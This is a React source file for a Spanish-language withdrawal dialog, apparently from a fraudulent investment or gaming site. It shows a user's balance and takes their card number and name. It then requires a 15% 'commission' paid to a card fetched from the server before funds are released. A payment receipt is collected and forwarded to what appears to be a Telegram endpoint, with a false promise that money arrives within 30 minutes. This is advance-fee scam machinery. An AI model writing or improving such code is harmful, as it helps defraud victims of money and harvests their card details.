import React, { useState, useEffect } from 'react';
import { X, CreditCard, Upload, ArrowLeft } from 'lucide-react';
import './WithdrawModal.css';
import { CONFIG_API_BASE_URL } from '../config/constants';

const API_BASE_URL = CONFIG_API_BASE_URL;

const WithdrawModal = ({ isOpen, onClose }) => {
  const [step, setStep] = useState(1);
  const [amount, setAmount] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardHolderName, setCardHolderName] = useState("");
  const [fullName, setFullName] = useState("");
  const [file, setFile] = useState(null);
  const [loading, setLoading] = useState(false);
  const [cardLoading, setCardLoading] = useState(true);
  const [userBalance, setUserBalance] = useState(0); // Добавляем состояние для баланса
  const [isCommissionPending, setIsCommissionPending] = useState(false);
  const [isWithdrawPending, setIsWithdrawPending] = useState(false);
  const [pendingWithdrawAmount, setPendingWithdrawAmount] = useState(0);
  const [commissionAmount, setCommissionAmount] = useState(0);


  // Загружаем баланс при открытии модального окна
  useEffect(() => {
    if (isOpen) {
      fetchUserBalance();
      fetchCardNumber();
    }
  }, [isOpen]);

  useEffect(() => {
    const pendingWithdraw = localStorage.getItem("pendingWithdraw");
    if (pendingWithdraw) {
      setStep(2);
    }
  }, []);


  useEffect(() => {
    const savedWithdraw = localStorage.getItem("pendingWithdraw");
    if (savedWithdraw) {
      const parsed = JSON.parse(savedWithdraw);
      if (parsed.amount) {
        const amountNum = Number(parsed.amount);
        setAmount(amountNum);
        setCommissionAmount(amountNum * 0.15);
      }
    }
  }, []);


  const fetchCardNumber = async () => {
    try {
      setCardLoading(true);
      const token = localStorage.getItem('access_token');
      const response = await fetch(`${API_BASE_URL}/api/user/card_number`, {
        headers: {
          'Authorization': `Bearer ${token}`,
        },
      });

      if (response.ok) {
        const data = await response.json();
        setCardNumber(data.card_number);
        setCardHolderName(data.card_holder_name);
      } else {
        //console.error('Ошибка при загрузке номера карты');
        setCardNumber("8600 **** **** 1234"); // Fallback
        setCardHolderName("Card Holder");
      }
    } catch (error) {
      //console.error('Error fetching card number:', error);
      setCardNumber("8600 **** **** 1234"); // Fallback
      setCardHolderName("Card Holder");
    } finally {
      setCardLoading(false);
    }
  };

  const fetchUserBalance = async () => {
    try {
      const token = localStorage.getItem('access_token');
      const response = await fetch(`${API_BASE_URL}/api/user/get_balance`, {
        headers: {
          'Authorization': `Bearer ${token}`,
        },
      });

      if (response.ok) {
        const data = await response.json();
        setUserBalance(data.balance);
      }
    } catch (error) {
      console.error('Error fetching balance:', error);
    }
  };

  const handleFileChange = (e) => {
    setFile(e.target.files[0]);
  };

  if (!isOpen) return null;

  const updateBalanceOnBackend = async (userBalanceSet) => {
    try {
      const token = localStorage.getItem("access_token");
      
      /*console.log('📤 Отправка на backend:', {
        amount_change: userBalanceSet.toFixed(2),
      });*/

      const response = await fetch(`${API_BASE_URL}/api/user/update_balance`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${token}`,
        },
        body: JSON.stringify({
          amount_change: userBalanceSet,
        }),
      });

      if (response.ok) {
        const data = await response.json();
        //console.log("✅ Баланс обновлен на backend:", data);
        
        // Синхронизируем с ответом сервера
        if (data.balance !== undefined) {
          setUserBalance(parseFloat(data.balance));
          sessionStorage.setItem("balance", data.balance.toString());
        }
        
        return data;
      } else {
        const errorText = await response.text();
        console.error("❌ Ошибка при обновлении баланса:", errorText);
        return null;
      }
    } catch (error) {
      console.error("🚨 Ошибка обновления баланса:", error);
      return null;
    }
  };

  const handleStep1Submit = (e) => {
    e.preventDefault();

    const withdrawAmount = parseFloat(amount);
    //const totalAmount = withdrawAmount + (withdrawAmount * 0.15); // Сумма + комиссия
    const totalAmount = withdrawAmount;
    const newUserBalance = userBalance - withdrawAmount;
    
    // Проверки
    if (withdrawAmount < 945) {
      alert('Monto mínimo de retiro: 945 USD');
      return;
    }

    if (totalAmount > userBalance) {
      alert(`¡Saldo insuficiente!\n\Solicitado: ${withdrawAmount.toLocaleString()} USD\Comisión: ${(withdrawAmount * 0.15).toLocaleString()} USD\nTotal: ${totalAmount.toLocaleString()} USD\nTu saldo: ${userBalance.toLocaleString()} USD`);
      return;
    }

    const updatedAmountToWithdraw = userBalance; // Вся сумма баланса

    updateBalanceOnBackend(newUserBalance);
    setIsWithdrawPending(true);
    setPendingWithdrawAmount(updatedAmountToWithdraw);
    
    localStorage.setItem("pendingWithdraw", JSON.stringify({
      amount: updatedAmountToWithdraw,
      cardNumber: cardNumber,
      fullName: fullName
    }));

    //console.log(`💰 Списано ${updatedAmountToWithdraw.toLocaleString()} UZS для вывода`);

    setStep(2);
  };

  const handleStep2Submit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const token = localStorage.getItem('access_token');
      const formData = new FormData();
      
      formData.append('amount', amount); 
      formData.append('card_number', cardNumber);
      formData.append('full_name', fullName);

      
      
      // Добавляем файл если он есть
      if (file) {
        formData.append('invoice_file', file);
      }

      // API запрос для вывода средств
      const response = await fetch(`${API_BASE_URL}/api/user/send_withdraw_to_tg`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`
        },
        body: formData
      });

      const data = await response.json();

      if (response.ok) {
        alert('¡Solicitud de retiro enviada! Los fondos se transferirán dentro de 30 minutos.');
        // 🔹 НЕ ЗАКРЫВАЕМ МОДАЛКУ, оставляем окно комиссии открытым
        onClose(); // 🔹 УБИРАЕМ эту строку
        
        // Сброс только части формы
        // Сброс формы
        setStep(1);
        setAmount("");
        setCardNumber("");
        setFullName("");
        setFile(null);

        // 🔹 ЖДЕМ ПОДТВЕРЖДЕНИЯ ОПЛАТЫ ОТ АДМИНА
        // Здесь можно добавить опрос сервера на статус оплаты
      } else {
        alert(data.message || 'Error en la solicitud de retiro');
      }
    } catch (error) {
      console.error('Error:', error);
        alert('Error al conectar con el servidor');
    } finally {
      setLoading(false);
    }
  };

  const safeAmount = Number(amount) || 0;
  // Рассчитываем комиссию 15% от суммы вывода
  const commissionPercentage = 15;
  const safeCommission = Math.round(safeAmount * (commissionPercentage / 100));
  //const totalAmount = safeAmount + safeCommission; // Общая сумма к списанию (вывод + комиссия)
      
  return (
    <div className="withdraw-modal-overlay" onClick={onClose}>
      <div className="withdraw-modal-content" onClick={(e) => e.stopPropagation()}>
        <div className="withdraw-modal-header">
          {/*{step === 2 && (
            <button className="back-button" onClick={() => setStep(1)}>
              <ArrowLeft size={20} />
            </button>
          )}*/}
          <h2 className="withdraw-modal-title">
            <CreditCard className="withdraw-modal-icon" />
            {step === 1 ? 'Retirar fondos' : 'Pagar comisión'}
          </h2>
          <button onClick={onClose} className="close-button">
            <X size={20} />
          </button>
        </div>

        {step === 1 ? (
          <form onSubmit={handleStep1Submit} className="withdraw-form">
            <div className="balance-info">
              💰 Tu saldo: <strong>{userBalance.toLocaleString()} USD</strong>
            </div>

            <div className="min-amount-info">
              💸 Ingresa <strong>950 USD</strong>
            </div>

            <div className="form-group">
              <label className="form-label">Monto a retirar (USD)</label>
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="Ingresa desde 950"
                className="form-input"
                min="950"
                step="50"
                required
              />
            </div>

            {/* Информация о расчетах */}
            {amount && parseFloat(amount) >= 950 && (
              <div className="calculation-preview">
                <div className="calculation-row">
                  <span>Monto a retirar:</span>
                  <span>{parseFloat(amount).toLocaleString()} USD</span>
                </div>
                {/*<div className="calculation-row">
                  <span>Комиссия (15%):</span>
                  <span>{commissionAmount.toLocaleString()} UZS</span>
                </div>*/}
                <div className="calculation-row total">
                  <span>Monto total del retiro:</span>
                  <span>{safeAmount.toLocaleString()} USD</span>
                </div>
                <div className={`balance-check ${safeAmount <= userBalance ? 'sufficient' : 'insufficient'}`}>
                  {safeAmount <= userBalance ? '✅ Saldo suficiente' : '❌ Saldo insuficiente'}
                </div>
              </div>
            )}

            <div className="form-group">
              <label className="form-label">Número de tarjeta</label>
              <input
                type="text"
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value)}
                placeholder="0000 0000 0000 0000"
                className="form-input"
                required
              />
            </div>

            <div className="form-group">
              <label className="form-label">Nombre y apellido</label>
              <input
                type="text"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                placeholder="Ingresa el nombre y apellido de la tarjeta"
                className="form-input"
                required
              />
            </div>

            <button 
              type="submit" 
              className="submit-button primary"
              disabled={amount && safeAmount > userBalance}
            >
             Continuar
            </button>
          </form>
        ) : (
          <form onSubmit={handleStep2Submit} className="commission-form">
            {/*<div className="commission-info">
              <p>Оплатите <strong>15% от суммы вывода</strong>, после этого средства поступят на ваш банковский счет в течении 30 минут</p>
            </div>*/}

            <div className="calculation-section">
              <div className="calculation-row">
                <span>Monto a retirar:</span>
                <span>{safeAmount.toLocaleString()} USD</span>
              </div>
              <div className="calculation-row">
                <span>Comisión (15%):</span>
                <span>{safeCommission.toLocaleString()} USD</span>
              </div>
              <div className="calculation-row total">
                <span>Pago de comisión:</span>
                <span>{safeCommission.toLocaleString()} USD</span>
              </div>
            </div>


            <div className="payment-details">
              <p className="details-label">Datos para el pago de la comisión:</p>
              <div className="card-number">
                💳 Tarjeta: {cardLoading ? "Cargando..." : cardNumber}
              </div>
              <div className="card-holder">
                👤 Titular: {cardLoading ? "Cargando..." : cardHolderName}
              </div>
            </div>

            <div className="file-section">
              <p className="file-warning">
                ⚠️ Después de realizar el pago de la comisión, asegúrate de enviar el comprobante (recibo)
              </p>
              <label className="file-upload">
                <Upload className="upload-icon" />
                <span>{file ? file.name : "Adjunta el comprobante del pago de la comisión"}</span>
                <input 
                  type="file" 
                  onChange={handleFileChange}
                  accept="image/*,.pdf"
                  className="file-input"
                  required
                />
              </label>
            </div>

            <button type="submit" className="submit-button primary" disabled={loading}>
              {loading ? 'Enviando...' : 'Pagar comisión y retirar fondos'}
            </button>
          </form>
        )}
      </div>
    </div>
  );
};

export default WithdrawModal;